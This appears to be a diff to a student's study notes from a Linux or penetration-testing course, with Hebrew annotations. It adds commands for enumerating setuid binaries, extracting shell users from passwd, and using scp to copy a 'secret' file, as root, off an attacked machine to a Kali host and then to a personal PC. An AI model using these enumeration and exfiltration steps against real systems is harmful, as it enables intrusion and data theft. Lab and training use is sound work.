@@ -73,3 +73,32 @@ Find all processes run by you as an owner
 Enter their cpu and memory information into the file /exercise/session6.txt
 
 solution: ps -aux -U root | awk '{print $2, $3, $4}' > /root/exercise/session6.txt
+another way to use awk is with delimiter: awk -F'delimeter' '{print $2, $3, $4}'
+
+which [prog name] help to find executable in the system
+
+symbolic link - $ ln -s {source-filename} {symbolic-filename}
+
+find address of function in program:
+1) nm [program name] : grep [function name]
+2) gdb [program name]
+   print [function name]
+
+find / -name "file to find" - find the file name in all the system
+
+find / -perm /4000 2> /dev/null   - gives us all the file with setuid
+
+grep -E "/bin/bash|/bin/[a-z]?sh" passwd | cut -d: -f1 > new_userlist  יצירת יוזר ליסט מקובץ passwd
+
+
+$ scp username@from_host:file.txt /local/directory/  מאפשר להעביר קובץ מהקאלי למחשב האישי שלנו
+שלבים:
+scp secret kali@10.0.0.10:/home/kali/secret העברת קובץ מהעמדת תקיפה למחשב קאלי, עושים את זה ברוט של המחשב המותקף
+scp kali@18.156.101.169:/home/kali/erankamil/secret C:\Users\eranka\Desktop העברת הקובץ מהקאלי אליי למחשב , עושים את זה בסי אמ די שלי
+
+id command - shows the user-id , group-id
+
+ strace [name of exexutable]  - It intercepts and records the system calls which are called by a process and the signals which are received by a process
+
+chroot("some dir") - changing the root dir to the given dir , it can call only by root.
+setgid(99), setuid(99) - dropping privileges to NOBODY
